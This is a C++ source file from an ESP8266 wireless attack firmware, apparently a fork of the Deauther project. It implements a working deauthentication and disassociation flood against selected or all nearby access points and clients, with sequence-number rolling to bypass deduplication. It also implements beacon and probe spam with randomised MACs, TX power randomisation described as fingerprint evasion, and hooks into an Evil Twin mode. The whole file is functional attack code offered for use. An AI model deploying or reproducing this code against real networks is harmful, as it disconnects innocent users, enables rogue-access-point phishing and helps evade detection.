/* This software is licensed under the MIT License: https://github.com/Pepperjack-svg/Nyx8266 */

#include "Attack.h"

#include "settings.h"

#include "EvilTwin.h"

Attack::Attack() {
    getRandomMac(mac);

    if (settings::getAttackSettings().beacon_interval == INTERVAL_1S) {
        // 1s beacon interval
        beaconPacket[32] = 0xe8;
        beaconPacket[33] = 0x03;
    } else {
        // 100ms beacon interval
        beaconPacket[32] = 0x64;
        beaconPacket[33] = 0x00;
    }

    deauth.time = currentTime;
    beacon.time = currentTime;
    probe.time  = currentTime;
}

void Attack::start() {
    stop();
    prntln(A_START);
    attackTime      = currentTime;
    attackStartTime = currentTime;
    accesspoints.sortAfterChannel();
    stations.sortAfterChannel();
    /* Set maximum TX power before the first packet is sent.
       updateCounter() normally does this, but it only runs after the first
       1-second tick — without this call the radio stays at whatever power
       level was last set (could be 0 dBm from a previous random_tx cycle). */
    setOutputPower(20.5f);
    running = true;
}

void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool output, uint32_t timeout) {
    Attack::beacon.active = beacon;
    Attack::deauth.active = deauth || deauthAll;
    Attack::deauthAll     = deauthAll;
    Attack::probe.active  = probe;

    Attack::output  = output;
    Attack::timeout = timeout;

    if (beacon || probe || deauthAll || deauth || !EvilTwin::isRunning()) {
        start();
        /* stop() inside start() clears active flags when restarting a running
           attack. Re-apply them so updateCounter() computes the correct maxPkts. */
        Attack::beacon.active = beacon;
        Attack::deauth.active = deauth || deauthAll;
        Attack::probe.active  = probe;
        /* Pre-compute maxPkts immediately — normally updateCounter() runs only
           after the first 1-second tick, leaving maxPkts=0 and blocking all
           packets for the entire first second of the attack. */
        updateCounter();
    } else {
        prntln(A_NO_MODE_ERROR);
        EvilTwin::stop();
        accesspoints.sort();
        stations.sort();
        stop();
    }
}

void Attack::stop() {
    if (running) {
        running              = false;
        deauthPkts           = 0;
        beaconPkts           = 0;
        probePkts            = 0;
        deauth.packetCounter = 0;
        beacon.packetCounter = 0;
        probe.packetCounter  = 0;
        deauth.maxPkts       = 0;
        beacon.maxPkts       = 0;
        probe.maxPkts        = 0;
        packetRate           = 0;
        deauth.tc            = 0;
        beacon.tc            = 0;
        probe.tc             = 0;
        deauth.active        = false;
        beacon.active        = false;
        probe.active         = false;
        prntln(A_STOP);
    }
}

bool Attack::isRunning() {
    return running;
}

void Attack::updateCounter() {
    // stop when timeout is active and time is up
    if ((timeout > 0) && (currentTime - attackStartTime >= timeout)) {
        prntln(A_TIMEOUT);
        stop();
        return;
    }

    // deauth packets per second
    if (deauth.active) {
        if (deauthAll) {
            /* Count actual frames, not targets.
               AP broadcast deauth  = 2 frames (deauth + disassoc, AP→FF:FF:FF:FF:FF:FF).
               Station unicast deauth = 4 frames (deauth+disassoc AP→STA, deauth+disassoc STA→AP).
               deauth.packetCounter increments by these amounts, so maxPkts must match or
               the guard (packetCounter < maxPkts) cuts the sweep short.
               With the old formula (apCount + stCount*2), each AP consumed 2 counter
               increments against a budget of 1 — only half the APs got deauthed per second. */
            uint32_t total = accesspoints.count() * 2 + stations.count() * 4;
            uint32_t excl  = names.selected() * 2; // approx: treat excluded names as AP-class (2 frames)
            deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
                             (total > excl ? total - excl : 0);
        }
        else deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
                              (accesspoints.selected() * 2 + stations.selected() * 4 + names.selected() * 2 + names.stations() * 2);
    } else {
        deauth.maxPkts = 0;
    }

    // beacon packets per second
    if (beacon.active) {
        beacon.maxPkts = ssids.count();

        if (settings::getAttackSettings().beacon_interval == INTERVAL_100MS) beacon.maxPkts *= 10;
    } else {
        beacon.maxPkts = 0;
    }

    // probe packets per second
    if (probe.active) probe.maxPkts = ssids.count() * settings::getAttackSettings().probe_frames_per_ssid;
    else probe.maxPkts = 0;

    /* TX power policy:
       Deauth always runs at 20.5 dBm — random_tx must never reduce it.
       random_tx only applies to beacon/probe (fingerprint evasion feature).
       Without this guard, running deauth + beacon with random_tx=true would
       randomly set deauth power as low as 0 dBm every second. */
    if (deauth.active) {
        setOutputPower(20.5f);
    } else if (settings::getAttackSettings().random_tx && (beacon.active || probe.active)) {
        setOutputPower((float)random(0, 21));
    } else {
        setOutputPower(20.5f);
    }

    // reset counters
    deauthPkts           = deauth.packetCounter;
    beaconPkts           = beacon.packetCounter;
    probePkts            = probe.packetCounter;
    packetRate           = tmpPacketRate;
    deauth.packetCounter = 0;
    beacon.packetCounter = 0;
    probe.packetCounter  = 0;
    deauth.tc            = 0;
    beacon.tc            = 0;
    probe.tc             = 0;
    tmpPacketRate        = 0;
}

void Attack::status() {
    char s[120];

    sprintf(s, str(
                A_STATUS).c_str(), packetRate, deauthPkts, deauth.maxPkts, beaconPkts, beacon.maxPkts, probePkts,
            probe.maxPkts);
    prnt(String(s));
}

String Attack::getStatusJSON() {
    /* reserve(180) pre-allocates enough capacity for a full status JSON.
       Without reserve(), each += triggers a realloc + memcpy chain —
       6 fields × ~30 bytes each = ~12 heap operations per HTTP poll. */
    String json;
    json.reserve(180);

    json += '[';
    json += '['; json += b2s(deauth.active && !deauthAll); json += ',';
    json += scan.countSelected(); json += ',';
    json += deauthPkts; json += ','; json += deauth.maxPkts; json += ']'; json += ',';

    json += '['; json += b2s(beacon.active); json += ',';
    json += ssids.count(); json += ',';
    json += beaconPkts; json += ','; json += beacon.maxPkts; json += ']'; json += ',';

    json += '['; json += b2s(probe.active); json += ',';
    json += ssids.count(); json += ',';
    json += probePkts; json += ','; json += probe.maxPkts; json += ']'; json += ',';

    json += '['; json += b2s(deauth.active && deauthAll); json += ',';
    json += scan.countAll(); json += ',';
    json += deauthPkts; json += ','; json += deauth.maxPkts; json += ']'; json += ',';

    /* Evil Twin entry: [running, "SSID", rssi]
       RSSI (int8_t dBm) is now included so the WebUI can show signal strength
       of the target AP without a separate HTTP round-trip. */
    json += '['; json += b2s(EvilTwin::isRunning()); json += ',';
    json += '"'; json += escape(scan.getEndSSID()); json += '"'; json += ',';
    json += scan.getEndRSSI();
    json += ']'; json += ',';

    json += packetRate;
    json += ']';
    return json;
}

void Attack::update() {
    if (!running || scan.isScanning()) return;

    apCount = accesspoints.count();
    stCount = stations.count();
    nCount  = names.count();

    // run/update all attacks
    deauthUpdate();
    deauthAllUpdate();
    beaconUpdate();
    probeUpdate();

    // each second
    if (currentTime - attackTime > 1000) {
        attackTime = currentTime; // update time
        updateCounter();

        if (output) status();     // status update
        getRandomMac(mac);        // generate new random mac
    }
}

void Attack::deauthUpdate() {
    if (!deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
            // APs
            if ((apCount > 0) && (deauth.tc < apCount)) {
                if (accesspoints.getSelected(deauth.tc)) {
                    deauth.tc += deauthAP(deauth.tc);
                } else deauth.tc++;
            }

            // Stations
            else if ((stCount > 0) && (deauth.tc >= apCount) && (deauth.tc < stCount + apCount)) {
                if (stations.getSelected(deauth.tc - apCount)) {
                    deauth.tc += deauthStation(deauth.tc - apCount);
                } else deauth.tc++;
            }

            // Names
            else if ((nCount > 0) && (deauth.tc >= apCount + stCount) && (deauth.tc < nCount + stCount + apCount)) {
                if (names.getSelected(deauth.tc - stCount - apCount)) {
                    deauth.tc += deauthName(deauth.tc - stCount - apCount);
                } else deauth.tc++;
            }

            /* Match deauthAllUpdate() — yield after each burst so the LWIP
               stack and web server can process pending events. */
            yield();

            // reset counter
            if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
        }
    }
}

void Attack::deauthAllUpdate() {
    if (deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
            // APs
            if ((apCount > 0) && (deauth.tc < apCount)) {
                tmpID = names.findID(accesspoints.getMac(deauth.tc));

                if (tmpID < 0) {
                    deauth.tc += deauthAP(deauth.tc);
                } else if (!names.getSelected(tmpID)) {
                    deauth.tc += deauthAP(deauth.tc);
                } else deauth.tc++;
            }

            // Stations
            else if ((stCount > 0) && (deauth.tc >= apCount) && (deauth.tc < stCount + apCount)) {
                tmpID = names.findID(stations.getMac(deauth.tc - apCount));

                if (tmpID < 0) {
                    deauth.tc += deauthStation(deauth.tc - apCount);
                } else if (!names.getSelected(tmpID)) {
                    deauth.tc += deauthStation(deauth.tc - apCount);
                } else deauth.tc++;
            }

            // Names
            else if ((nCount > 0) && (deauth.tc >= apCount + stCount) && (deauth.tc < apCount + stCount + nCount)) {
                if (!names.getSelected(deauth.tc - apCount - stCount)) {
                    deauth.tc += deauthName(deauth.tc - apCount - stCount);
                } else deauth.tc++;
            }

            /* Feed the hardware WDT after each frame burst.
               wifi_send_pkt_freedom() is synchronous — with 50+ targets the
               loop body can exceed 100 ms total, triggering a WDT reset.
               yield() hands control back to the SDK/LWIP/WiFi stack briefly. */
            yield();

            // reset counter
            if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
        }
    }
}

void Attack::probeUpdate() {
    if (probe.active && (probe.maxPkts > 0) && (probe.packetCounter < probe.maxPkts)) {
        if (probe.time <= currentTime - (1000 / probe.maxPkts)) {
            if (settings::getAttackSettings().attack_all_ch) setWifiChannel(probe.tc % 11, true);
            probe.tc += sendProbe(probe.tc);

            if (probe.tc >= ssids.count()) probe.tc = 0;
        }
    }
}

void Attack::beaconUpdate() {
    if (beacon.active && (beacon.maxPkts > 0) && (beacon.packetCounter < beacon.maxPkts)) {
        if (beacon.time <= currentTime - (1000 / beacon.maxPkts)) {
            beacon.tc += sendBeacon(beacon.tc);

            if (beacon.tc >= ssids.count()) beacon.tc = 0;
        }
    }
}

bool Attack::deauthStation(int num) {
    return deauthDevice(stations.getAPMac(num), stations.getMac(num), settings::getAttackSettings().deauth_reason, stations.getCh(num));
}

bool Attack::deauthAP(int num) {
    return deauthDevice(accesspoints.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, accesspoints.getCh(num));
}

bool Attack::deauthName(int num) {
    if (names.isStation(num)) {
        return deauthDevice(names.getBssid(num), names.getMac(num), settings::getAttackSettings().deauth_reason, names.getCh(num));
    } else {
        return deauthDevice(names.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, names.getCh(num));
    }
}

bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch) {
    if (!apMac || !stMac) return false;

    bool success = false;

    /* Fixed-size arrays instead of VLAs — packetSize is always 26
       (sizeof deauthPacket). VLAs prevent compiler optimisation of the
       stack frame and are undefined behaviour in strict C++11. */
    uint8_t deauthpkt[26];
    uint8_t disassocpkt[26];
    memcpy(deauthpkt, deauthPacket, 26);

    memcpy(&deauthpkt[4],  stMac, 6);
    memcpy(&deauthpkt[10], apMac, 6);
    memcpy(&deauthpkt[16], apMac, 6);
    deauthpkt[24] = reason;

    /* Rolling sequence number — (BSSID, seqNum) deduplication bypass.
       802.11 Sequence Control: bits[15:4] = seqNum, bits[3:0] = fragNum. */
    uint16_t sc = (seqNum++ & 0x0FFF) << 4;
    deauthpkt[22] = sc & 0xFF;
    deauthpkt[23] = (sc >> 8) & 0xFF;

    deauthpkt[0] = 0xc0; // deauth AP→STA
    if (sendPacket(deauthpkt, 26, ch, true)) { success = true; deauth.packetCounter++; }

    memcpy(disassocpkt, deauthpkt, 26);
    disassocpkt[0] = 0xa0; // disassoc AP→STA
    if (sendPacket(disassocpkt, 26, ch, false)) { success = true; deauth.packetCounter++; }

    if (!macBroadcast(stMac)) {
        memcpy(&disassocpkt[4],  apMac, 6);
        memcpy(&disassocpkt[10], stMac, 6);
        memcpy(&disassocpkt[16], stMac, 6);

        disassocpkt[0] = 0xc0; // deauth STA→AP
        if (sendPacket(disassocpkt, 26, ch, false)) { success = true; deauth.packetCounter++; }

        disassocpkt[0] = 0xa0; // disassoc STA→AP
        if (sendPacket(disassocpkt, 26, ch, false)) { success = true; deauth.packetCounter++; }
    }

    /* Always advance the timer — if TX fails and we only update on success,
       the timer never advances and the loop fires at full speed on the next
       update() tick, flooding the SDK queue and starving the web server. */
    deauth.time = currentTime;
    return success;
}

bool Attack::sendBeacon(uint8_t tc) {
    if (settings::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
    mac[5] = tc;
    return sendBeacon(mac, ssids.getName(tc).c_str(), wifi_channel, ssids.getWPA2(tc));
}

bool Attack::sendBeacon(uint8_t* mac, const char* ssid, uint8_t ch, bool wpa2) {
    packetSize = sizeof(beaconPacket);

    if (wpa2) {
        beaconPacket[34] = 0x31;
    } else {
        beaconPacket[34] = 0x21;
        packetSize      -= 26;
    }

    int ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    memcpy(&beaconPacket[10], mac, 6);
    memcpy(&beaconPacket[16], mac, 6);
    memcpy(&beaconPacket[38], ssid, ssidLen);
    beaconPacket[82] = ch;

    /* Build into pre-allocated member buffer instead of new[]/delete[].
       sendBeacon() runs at up to 10 Hz × SSID count.  Each heap allocation
       leaves a hole that the ESP8266 allocator cannot always reclaim cleanly,
       causing progressive fragmentation until a malloc() fails mid-flight. */
    uint16_t tmpPacketSize = (packetSize - 32) + ssidLen;
    memcpy(&beaconBuf[0],           &beaconPacket[0], 38 + ssidLen);
    beaconBuf[37] = ssidLen;
    memcpy(&beaconBuf[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13);

    bool success = sendPacket(beaconBuf, tmpPacketSize, ch, false);

    if (success) {
        beacon.time = currentTime;
        beacon.packetCounter++;
    }

    return success;
}

bool Attack::sendProbe(uint8_t tc) {
    if (settings::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
    mac[5] = tc;
    return sendProbe(mac, ssids.getName(tc).c_str(), wifi_channel);
}

bool Attack::sendProbe(uint8_t* mac, const char* ssid, uint8_t ch) {
    int ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    // rebuild packet with correct SSID length: base (24) + tag header (2) + ssid + rates (10)
    uint16_t tmpPacketSize = 24 + 2 + ssidLen + 10;
    uint8_t  tmpPacket[tmpPacketSize];

    memcpy(tmpPacket, probePacket, 24);          // fixed header
    tmpPacket[24] = 0x00;                        // SSID tag number
    tmpPacket[25] = (uint8_t)ssidLen;            // correct SSID length
    memcpy(&tmpPacket[26], ssid, ssidLen);       // SSID payload
    memcpy(&tmpPacket[26 + ssidLen], &probePacket[58], 10); // supported rates

    memcpy(&tmpPacket[10], mac, 6);              // source MAC

    if (sendPacket(tmpPacket, tmpPacketSize, ch, false)) {
        probe.time = currentTime;
        probe.packetCounter++;
        return true;
    }

    return false;
}

bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool force_ch) {
    setWifiChannel(ch, force_ch);

    bool sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
    if (!sent) {
        /* SDK TX queue was full — wait 500 µs for the radio to drain one slot
           then retry once. Avoids silently dropping frames under burst load. */
        delayMicroseconds(500);
        sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
    }

    if (sent) ++tmpPacketRate;

    return sent;
}

void Attack::enableOutput() {
    output = true;
    prntln(A_ENABLED_OUTPUT);
}

void Attack::disableOutput() {
    output = false;
    prntln(A_DISABLED_OUTPUT);
}

uint32_t Attack::getDeauthPkts() {
    return deauthPkts;
}

uint32_t Attack::getBeaconPkts() {
    return beaconPkts;
}

uint32_t Attack::getProbePkts() {
    return probePkts;
}

uint32_t Attack::getDeauthMaxPkts() {
    return deauth.maxPkts;
}

uint32_t Attack::getBeaconMaxPkts() {
    return beacon.maxPkts;
}

uint32_t Attack::getProbeMaxPkts() {
    return probe.maxPkts;
}

uint32_t Attack::getPacketRate() {
    return packetRate;
}